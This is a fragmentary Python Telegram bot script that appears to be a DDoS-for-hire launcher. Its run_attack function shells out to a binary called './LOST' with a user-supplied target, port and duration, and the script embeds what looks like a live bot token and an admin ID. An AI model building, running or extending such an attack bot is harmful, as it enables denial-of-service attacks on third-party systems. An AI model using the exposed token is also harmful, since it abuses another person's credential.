...
bot_token = '7255031773:AAFTn3H2chqUyTG-n5WoAuquobpCaf3ay_o'  # Replace with your bot token
...
ADMIN_ID = 7357694692  # Replace with the actual admin's user ID
...
def run_attack(target, port, attack_time, sent_message):
    try:
        full_command = f"./LOST {target} {port} {attack_time}"
...
def handle_contact_admin(message):
    bot.reply_to(message, f"📞 @DEVX76: {ADMIN_ID}")
